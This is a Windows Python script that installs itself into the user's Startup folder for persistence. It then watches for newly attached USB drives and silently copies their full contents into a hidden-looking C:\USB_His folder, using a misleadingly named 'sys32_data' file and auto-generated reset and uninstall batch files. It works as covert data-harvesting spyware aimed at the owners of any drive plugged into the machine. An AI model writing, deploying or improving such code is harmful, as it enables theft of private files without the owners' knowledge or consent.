import os, shutil, stat, sys, win32api, time, datetime
from distutils.dir_util import copy_tree
curr_dir = sys.argv[0]
args = sys.argv[1:]
argc = len(args)
def get_IVG(location):
	try:
		return open(os.path.join(location, 'System Volume Information', 'IndexerVolumeGuid')).readlines()[0]
	except:
		return 'None_Info'
def copy_all(src, dst):
	os.system('robocopy '+src+' '+dst+' /E /NFL /NDL /NJH /NJS /nc /ns /np')
def create_dir(src):
	try:
		os.system('mkdir C:\\tmp')
	except:
		pass
	os.system('robocopy C:\\tmp ' + src + ' /mir')
	os.system('rd C:\\tmp')
def remove_all(src):
	create_dir(src)
def get_drives():
	drives = win32api.GetLogicalDriveStrings()
	return drives.split('\000')[:-1]
def get_startup():
	return str(os.path.join('C:\\', 'Users', os.getenv('username'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp'))
def MAIN_INSTALL(first=True):
	startup_dir = get_startup()
	try:
		shutil.copy(curr_dir, startup_dir)
	except:
		pass
	create_dir('C:\\USB_His\\')
	drives = get_drives()
	f_dir = startup_dir + '\\' + os.path.basename(curr_dir)
	if first:
		drives = drives[:-1]
	with open("C:\\USB_His\sys32_data", 'w') as f:
		for st in [(str(dr)+'\n') for dr in drives]:
			f.write(st)
	with open('C:\\USB_His\\reset_all.bat', 'w') as f:
		f.write('taskkill /IM Robocopy.exe /F\n' + 
				'python \"' + f_dir + '\" INSTALL')
	with open('C:\\USB_His\\uninstall.bat', 'w') as f:
		f.write("taskkill /IM Robocopy.exe /F\n" 
				"taskkill /IM python.exe /F\n" 
				#"taskkill /IM explorer.exe /F\n" 
				#"start explorer\n"
				'python \"' + f_dir + '\" UNINSTALL\n')
	#os.system("shutdown -t 0 -r -f")
def MAIN_RUN(usbs_done):
	drives = set(get_drives())
	USBs = drives - sys_drives
	for USB in USBs:
		IVG = get_IVG(USB)
		print(IVG)
		if not IVG in usbs_done:
			copy_all(USB, 'C:\\USB_His\\' + str(datetime.datetime.now().timestamp()) + '\\')
			usbs_done += [IVG]
	time.sleep(10)
	MAIN_RUN(usbs_done)
def MAIN_UNINSTALL():
	# Clear Data
	remove_all('C:\\USB_His\\')
	os.remove(curr_dir)
#======================================================================#
if argc==1:
	if args[0]=='INSTALL':
		MAIN_INSTALL(first=False)
	elif args[0]=='UNINSTALL':
		MAIN_UNINSTALL()
	sys.exit(1)
if (not os.path.exists('C:\\USB_His\sys32_data')) or (os.path.dirname(curr_dir)!=get_startup()):
	print(MAIN_INSTALL())
else:
	sys_drives = set([drive.rstrip('\n') for drive in open("C:\\USB_His\sys32_data", 'r').readlines()])
	MAIN_RUN(list())